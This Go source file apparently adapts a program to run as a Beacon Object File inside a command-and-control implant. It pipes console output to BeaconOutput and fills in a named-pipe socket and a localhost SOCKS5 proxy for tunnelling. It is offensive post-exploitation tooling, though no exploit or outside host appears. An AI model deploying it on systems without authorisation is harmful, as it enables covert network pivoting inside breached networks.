//go:build windows && bofpe

package main

/*
#include <stdlib.h>
#include "beacon.h"

#cgo LDFLAGS: -L. -lbeacon
*/
import "C"
import (
	"fmt"
	"io"
	"os"
	"strings"
	"sync"
	"syscall"

	"github.com/google/uuid"
)

var (
	setStdHandle = kernel32.NewProc("SetStdHandle")
	getStdHandle = kernel32.NewProc("GetStdHandle")
)

const (
	STD_OUTPUT_HANDLE = ^uint32(10) + 1 // -11 & 0xFFFFFFFF
	STD_ERROR_HANDLE  = ^uint32(11) + 1 // -12 & 0xFFFFFFFF
)

// Custom writer that sends to BeaconOutput
type beaconWriter struct {
	mu sync.Mutex
}

func (w *beaconWriter) Write(p []byte) (n int, err error) {
	if len(p) > 0 {
		w.mu.Lock()
		defer w.mu.Unlock()

		cData := C.CBytes(p)
		defer C.free(cData)
		C.BeaconOutput(0, (*C.char)(cData), C.int(len(p)))
	}
	return len(p), nil
}

// BeaconPrintf formats a string and sends it to BeaconOutput
func BeaconPrintf(format string, args ...interface{}) {
	formatted := fmt.Sprintf(format, args...)
	if len(formatted) > 0 {
		cData := C.CBytes([]byte(formatted))
		defer C.free(cData)
		C.BeaconOutput(0, (*C.char)(cData), C.int(len(formatted)))
	}
}

func setupRedirection() (originalStdout *os.File, originalStderr *os.File, originalStdoutHandle syscall.Handle, originalStderrHandle syscall.Handle, pipeRead *os.File, pipeWrite *os.File) {
	// Get the original stdout and stderr handles
	stdoutHandle, _, _ := getStdHandle.Call(uintptr(STD_OUTPUT_HANDLE))
	originalStdoutHandle = syscall.Handle(stdoutHandle)

	stderrHandle, _, _ := getStdHandle.Call(uintptr(STD_ERROR_HANDLE))
	originalStderrHandle = syscall.Handle(stderrHandle)

	// Save original os.Stdout and os.Stderr
	originalStdout = os.Stdout
	originalStderr = os.Stderr

	// Create a pipe
	r, w, _ := os.Pipe()
	pipeRead = r
	pipeWrite = w

	// Get the write end's handle
	writeHandle := syscall.Handle(w.Fd())

	// Set both Windows stdout and stderr handles to our pipe's write end
	setStdHandle.Call(uintptr(STD_OUTPUT_HANDLE), uintptr(writeHandle))
	setStdHandle.Call(uintptr(STD_ERROR_HANDLE), uintptr(writeHandle))

	// Also redirect Go's os.Stdout and os.Stderr
	os.Stdout = w
	os.Stderr = w

	return
}

func restoreRedirection(originalStdout *os.File, originalStderr *os.File, originalStdoutHandle syscall.Handle, originalStderrHandle syscall.Handle, pipeWrite *os.File) {
	// Restore Windows stdout and stderr handles
	setStdHandle.Call(uintptr(STD_OUTPUT_HANDLE), uintptr(originalStdoutHandle))
	setStdHandle.Call(uintptr(STD_ERROR_HANDLE), uintptr(originalStderrHandle))

	// Restore Go's os.Stdout and os.Stderr
	if originalStdout != nil {
		os.Stdout = originalStdout
	}
	if originalStderr != nil {
		os.Stderr = originalStderr
	}

	// Close the write end of the pipe
	if pipeWrite != nil {
		pipeWrite.Close()
	}
}

func captureOutput(r *os.File, done chan bool) {
	writer := &beaconWriter{}
	go func() {
		buf := make([]byte, 4096)
		for {
			select {
			case <-done:
				return
			default:
				n, err := r.Read(buf)
				if err != nil {
					if err != io.EOF {
						return
					}
					return
				}
				if n > 0 {
					writer.Write(buf[:n])
				}
			}
		}
	}()
}

//export Go
func Go(data *C.char, length C.int) {
	// Setup redirection
	originalStdout, originalStderr, originalStdoutHandle, originalStderrHandle, pipeRead, pipeWrite := setupRedirection()
	done := make(chan bool)

	// Start capturing output
	captureOutput(pipeRead, done)

	// Ensure restoration happens before returning
	defer func() {
		close(done)
		restoreRedirection(originalStdout, originalStderr, originalStdoutHandle, originalStderrHandle, pipeWrite)
	}()

	var parser C.datap
	C.BeaconDataParse(&parser, data, length)

	// Create a default arg[0] and extract packed string arguments until no more left
	tokens := []string{"program.exe"}
	var size C.int
	for extracted := C.BeaconDataExtract(&parser, &size); extracted != nil; extracted = C.BeaconDataExtract(&parser, &size) {
		tokens = append(tokens, C.GoStringN(extracted, size-1))
	}

	// Check for required arguments and add defaults if missing
	hasSocket := false
	hasSocks5 := false

	for _, token := range tokens {
		if strings.HasPrefix(token, "-socket") || strings.HasPrefix(token, "--socket") {
			hasSocket = true
		}
		if strings.HasPrefix(token, "-socks5-server") || strings.HasPrefix(token, "--socks5-server") {
			hasSocks5 = true
		}
	}

	// Add missing arguments
	if !hasSocket {
		socket := fmt.Sprintf(`\\.\pipe\%s`, uuid.New().String())
		tokens = append(tokens, "--socket", socket)
		BeaconPrintf("[=] No socket provided, using random pipe: %s\n", socket)
	}

	// Default SOCKS5 proxy if not specified
	if !hasSocks5 {
		tokens = append(tokens, "--socks5-server", "localhost:1080")
		BeaconPrintf("[=] No SOCKS5 server specified, defaulting to localhost:1080\n")
	}

	os.Args = tokens
	main()
}
